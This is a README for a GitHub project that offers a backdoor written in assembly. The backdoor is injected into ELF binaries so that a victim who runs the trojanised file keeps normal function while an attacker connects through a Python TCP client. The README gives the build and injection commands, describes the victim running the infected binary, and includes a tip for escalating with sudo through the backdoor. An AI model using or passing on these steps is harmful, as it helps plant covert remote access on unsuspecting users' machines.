# Simple-elf-backdoor

It is an elf backdoor written in pure assembly language.

## Usage
### backdoor
```bash
$ gcc elfinject.c -o elfinject -lelf
$ nasm -f bin backdoor.s -o backdoor.bin
$ ./elfinject elftarget backdoor.bin ".injected" 0x800000 0
```
### backdoor_client
```
$ python3 tcpClient.py
```
## victim
If victim download or obtain the file in any way
```
$ ./elftarget
```
The victim uses the original program without problems and Attackers use backdoors.

## Demo
### backdoor
![backdoor](https://github.com/gbdngb12/Simple-elf-backdoor/assets/104804087/84720f5f-7caf-45aa-b28a-00632b779317)

### backdoor_client
![client](https://github.com/gbdngb12/Simple-elf-backdoor/assets/104804087/29cf4cf6-bf88-456f-8cc2-052c8ae33f0c)

## Tips
### How to use sudo
```bash
$ python3 tcpClient
echo "password" | sudo -S <command>
```
